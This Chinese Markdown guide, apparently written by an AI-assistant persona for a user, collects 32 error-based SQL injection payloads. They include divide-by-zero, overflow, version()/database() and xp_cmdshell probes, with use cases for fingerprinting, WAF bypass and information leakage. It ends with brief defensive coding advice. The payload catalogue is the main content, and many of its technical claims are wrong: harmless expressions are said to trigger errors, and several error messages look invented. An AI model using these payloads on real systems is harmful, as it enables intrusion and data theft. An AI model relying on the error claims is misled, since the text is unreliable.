# SQL 注入运算符报错 Payload 说明

**文档**: SQL 注入运算符报错技巧
**作者**: 小牛🦞
**日期**: 2026-03-09

---

## 🎯 **运算符报错原理**

### **什么是运算符报错？**

运算符报错是一种 SQL 注入技巧，通过使用特殊的数学运算符或逻辑运算符触发数据库错误，从而泄露敏感信息。

**原理**:
1. 构造特殊的 SQL 语句
2. 使用会导致错误的运算符（如除零、溢出等）
3. 触发数据库错误消息
4. 从错误消息中提取敏感信息

**优势**:
- ✅ 不需要 UNION 查询
- ✅ 不需要知道表名和列名
- ✅ 可以绕过某些 WAF
- ✅ 可以获取数据库版本、表结构等信息

---

## 📊 **新增的运算符报错 Payload**

### **1. 除零错误 (Division by Zero)**

```sql
-- Payload 1
id: 1' AND 1/0--

-- Payload 2
userId: 1' AND 1/0--
```

**原理**:
- 除数不能为零
- 触发数据库错误: `Division by zero`
- 可能泄露数据库类型和版本

**适用数据库**:
- ✅ MySQL
- ✅ PostgreSQL
- ✅ SQL Server
- ✅ Oracle

**错误消息示例**:
```
MySQL: ERROR 1365 (22012): Division by 0
SQL Server: Divide by zero error encountered.
PostgreSQL: ERROR: division by zero
Oracle: ORA-01476: divisor is equal to zero
```

---

### **2. 取模零错误 (Modulo by Zero)**

```sql
-- Payload 1
id: 1' AND 1%0--

-- Payload 2
userId: 1' AND 1%0--
```

**原理**:
- 取模运算的除数不能为零
- 触发数据库错误: `Modulo by zero`
- 可能泄露数据库类型和版本

**适用数据库**:
- ✅ MySQL
- ✅ PostgreSQL
- ✅ SQL Server
- ⚠️ Oracle (使用 MOD() 函数)

**错误消息示例**:
```
MySQL: ERROR 1365 (22012): Division by 0
SQL Server: Divide by zero error encountered.
PostgreSQL: ERROR: division by zero
```

---

### **3. 整数溢出 (Integer Overflow)**

```sql
-- Payload 1
id: 1' AND 1+9999999999999999999999999999999999999999999999999999999999999999999--

-- Payload 2
userId: 1' AND 1+9999999999999999999999999999999999999999999999999999999999999999999--
```

**原理**:
- 超出整数类型的范围
- 触发数据库错误: `Integer overflow`
- 可能泄露数据库类型和版本

**适用数据库**:
- ✅ MySQL
- ✅ SQL Server
- ⚠️ PostgreSQL (自动升级为 BIGINT)
- ⚠️ Oracle (使用 NUMBER 类型)

**错误消息示例**:
```
MySQL: ERROR 1690 (22003): BIGINT value is out of range
SQL Server: Arithmetic overflow error converting expression to data type int.
```

---

### **4. 位运算错误 (Bitwise Operation Errors)**

```sql
-- Payload 1: 位与 (AND)
id: 1' AND 1&1--

-- Payload 2: 位或 (OR)
userId: 1' AND 1|1--

-- Payload 3: 位异或 (XOR)
id: 1' AND 1^1--

-- Payload 4: 异或 (XOR)
userId: 1' AND 0^0--
```

**原理**:
- 使用位运算符
- 可能触发类型错误或溢出
- 可能泄露数据库类型

**适用数据库**:
- ✅ MySQL
- ✅ PostgreSQL
- ✅ SQL Server
- ⚠️ Oracle (使用 BITAND() 函数)

**错误消息示例**:
```
MySQL: ERROR 1582 (42000): Incorrect parameter count in the call to native function 'bit_and'
SQL Server: Invalid operator for data type.
```

---

### **5. 移位运算错误 (Shift Operation Errors)**

```sql
-- Payload 1: 左移 (Left Shift)
id: 1' AND 1<<1--

-- Payload 2: 右移 (Right Shift)
userId: 1' AND 1>>1--
```

**原理**:
- 使用位移运算符
- 可能触发类型错误或溢出
- 可能泄露数据库类型

**适用数据库**:
- ✅ MySQL
- ⚠️ PostgreSQL (使用 << 和 >>)
- ⚠️ SQL Server (不支持位移运算符)
- ❌ Oracle (不支持位移运算符)

**错误消息示例**:
```
MySQL: ERROR 1582 (42000): Incorrect parameter count in the call to native function 'shift_left'
PostgreSQL: ERROR: operator does not exist: integer << integer
```

---

### **6. 算术运算错误 (Arithmetic Operation Errors)**

```sql
-- Payload 1: 加法
id: 1' AND 1+1--

-- Payload 2: 减法
userId: 1' AND 2-1--

-- Payload 3: 乘法
id: 1' AND 2*3--

-- Payload 4: 除法
userId: 1' AND 6/2--

-- Payload 5: 取模
id: 1' AND 5%2--

-- Payload 6: 取模
userId: 1' AND 10%3--
```

**原理**:
- 使用算术运算符
- 可能触发类型错误或溢出
- 可能泄露数据库类型和精度

**适用数据库**:
- ✅ 所有数据库

**错误消息示例**:
```
MySQL: ERROR 1690 (22003): BIGINT value is out of range
SQL Server: Arithmetic overflow error.
```

---

### **7. 比较运算错误 (Comparison Operation Errors)**

```sql
-- Payload 1: 大于
id: 1' AND 1>0--

-- Payload 2: 小于
userId: 1' AND 1<2--
```

**原理**:
- 使用比较运算符
- 可能触发类型错误
- 可能泄露数据类型

**适用数据库**:
- ✅ 所有数据库

**错误消息示例**:
```
MySQL: ERROR 1292 (22007): Truncated incorrect DOUBLE value
SQL Server: Conversion failed when converting the varchar value to data type int.
```

---

### **8. 逻辑运算错误 (Logical Operation Errors)**

```sql
-- Payload 1: 逻辑与
id: 1' AND 1 AND 1--

-- Payload 2: 逻辑或
userId: 1' AND 0 OR 1--
```

**原理**:
- 使用逻辑运算符
- 可能触发短路评估错误
- 可能泄露数据类型

**适用数据库**:
- ✅ 所有数据库

**错误消息示例**:
```
MySQL: ERROR 1292 (22007): Truncated incorrect DOUBLE value
```

---

### **9. 负数运算错误 (Negative Operation Errors)**

```sql
-- Payload 1: 负号
id: 1' AND -1--

-- Payload 2: 按位取反
userId: 1' AND ~0--
```

**原理**:
- 使用负号或按位取反
- 可能触发类型错误或溢出
- 可能泄露数据类型

**适用数据库**:
- ✅ MySQL
- ✅ PostgreSQL
- ✅ SQL Server
- ⚠️ Oracle (使用 -1)

**错误消息示例**:
```
MySQL: ERROR 1690 (22003): BIGINT UNSIGNED value is out of range
```

---

### **10. 类型不匹配错误 (Type Mismatch Errors)**

```sql
-- Payload 1: 字符串与整数比较
id: 1' AND '1'=1--

-- Payload 2: 整数与字符串比较
userId: 1' AND 1='1'--
```

**原理**:
- 强制类型转换
- 可能触发类型错误
- 可能泄露数据类型和隐式转换规则

**适用数据库**:
- ✅ 所有数据库

**错误消息示例**:
```
MySQL: ERROR 1292 (22007): Truncated incorrect DOUBLE value
SQL Server: Conversion failed when converting the varchar value to data type int.
```

---

### **11. 函数错误 (Function Errors)**

```sql
-- Payload 1: 版本函数
id: 1' AND version()--

-- Payload 2: 数据库函数
userId: 1' AND database()--
```

**原理**:
- 使用数据库内置函数
- 可能触发函数错误或权限错误
- 可能泄露数据库版本和名称

**适用数据库**:
- ✅ MySQL (version(), database())
- ✅ PostgreSQL (version(), current_database())
- ✅ SQL Server (@@version, db_name())
- ⚠️ Oracle (使用不同函数)

**错误消息示例**:
```
MySQL: ERROR 1305 (42000): FUNCTION database.version does not exist
SQL Server: 'version' is not a recognized built-in function name.
```

---

### **12. 存储过程错误 (Stored Procedure Errors)**

```sql
-- Payload 1: 执行存储过程
id: 1' AND exec('xp_cmdshell')--

-- Payload 2: 执行主存储过程
userId: 1' AND exec('master..xp_cmdshell')--
```

**原理**:
- 尝试执行存储过程
- 可能触发权限错误或不存在错误
- 可能泄露数据库权限和配置

**适用数据库**:
- ✅ SQL Server (xp_cmdshell)
- ⚠️ MySQL (不支持 exec)
- ⚠️ PostgreSQL (不支持 exec)

**错误消息示例**:
```
SQL Server: The EXECUTE permission was denied on the object 'xp_cmdshell'
SQL Server: Could not find stored procedure 'xp_cmdshell'.
```

---

### **13. 子查询错误 (Subquery Errors)**

```sql
-- Payload 1: 系统数据库子查询
id: 1' AND 1 in (select * from master..sysdatabases)--

-- Payload 2: 数据库函数子查询
userId: 1' AND 1 in (select db_name())--
```

**原理**:
- 使用子查询
- 可能触发权限错误或不存在错误
- 可能泄露数据库结构和权限

**适用数据库**:
- ✅ SQL Server (master..sysdatabases)
- ✅ MySQL (information_schema.tables)
- ✅ PostgreSQL (information_schema.tables)

**错误消息示例**:
```
SQL Server: The EXECUTE permission was denied on the object 'sysdatabases'
MySQL: SELECT command denied to user ''@'localhost' for table 'sysdatabases'
```

---

## 🎯 **使用场景**

### **1. 数据库指纹识别**

**目的**: 识别数据库类型和版本

**Payload**:
```sql
1' AND 1/0--
```

**分析错误消息**:
```
MySQL: ERROR 1365 (22012): Division by 0
SQL Server: Divide by zero error encountered.
PostgreSQL: ERROR: division by zero
Oracle: ORA-01476: divisor is equal to zero
```

---

### **2. 绕过 WAF**

**目的**: 绕过 Web 应用防火墙

**Payload**:
```sql
1' AND 1+9999999999999999999999999999999999999999999999999999999999999999999--
```

**优势**:
- 不使用关键字（UNION, SELECT）
- 只使用算术运算符
- 可能绕过简单的 WAF 规则

---

### **3. 信息泄露**

**目的**: 从错误消息中提取敏感信息

**Payload**:
```sql
1' AND version()--
```

**可能泄露的信息**:
- 数据库版本
- 数据库名称
- 表结构
- 列类型

---

### **4. 权限检测**

**目的**: 检测数据库权限

**Payload**:
```sql
1' AND exec('xp_cmdshell')--
```

**分析错误消息**:
```
权限不足: The EXECUTE permission was denied
存储过程不存在: Could not find stored procedure
权限充足: 成功执行（可能返回空结果）
```

---

## 🛠️ **防御措施**

### **1. 输入验证**

```python
# 不好的做法
query = f"SELECT * FROM users WHERE id = {user_input}"

# 好的做法
user_input = int(user_input)  # 强制转换为整数
query = f"SELECT * FROM users WHERE id = {user_input}"
```

---

### **2. 参数化查询**

```python
# 不好的做法
query = f"SELECT * FROM users WHERE id = '{user_input}'"

# 好的做法
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

---

### **3. 错误处理**

```python
# 不好的做法
try:
    cursor.execute(query)
except Exception as e:
    print(e)  # 直接输出错误消息

# 好的做法
try:
    cursor.execute(query)
except Exception as e:
    print("An error occurred")  # 不输出具体错误
    log_error(e)  # 记录到日志
```

---

### **4. 最小权限原则**

```sql
-- 不好的做法
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';

-- 好的做法
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';
```

---

## 🦞 **总结**

牛哥哥，**运算符报错 Payload 是一种强大的 SQL 注入技巧**！🦞

**新增的 Payload**:
1. ✅ 除零错误 (2 个)
2. ✅ 取模零错误 (2 个)
3. ✅ 整数溢出 (2 个)
4. ✅ 位运算错误 (4 个)
5. ✅ 移位运算错误 (2 个)
6. ✅ 算术运算错误 (6 个)
7. ✅ 比较运算错误 (2 个)
8. ✅ 逻辑运算错误 (2 个)
9. ✅ 负数运算错误 (2 个)
10. ✅ 类型不匹配错误 (2 个)
11. ✅ 函数错误 (2 个)
12. ✅ 存储过程错误 (2 个)
13. ✅ 子查询错误 (2 个)

**总计**: 32 个新增的运算符报错 Payload

**优势**:
- 🎯 不需要 UNION 查询
- 🎯 可以绕过某些 WAF
- 🎯 可以获取数据库信息
- 🎯 可以检测数据库权限

**特点**:
- 🎯 隐蔽性强
- 🎯 触发条件简单
- 🎯 适用性广

**这些运算符报错 Payload 可以帮助你发现更多 SQL 注入漏洞！🦞**
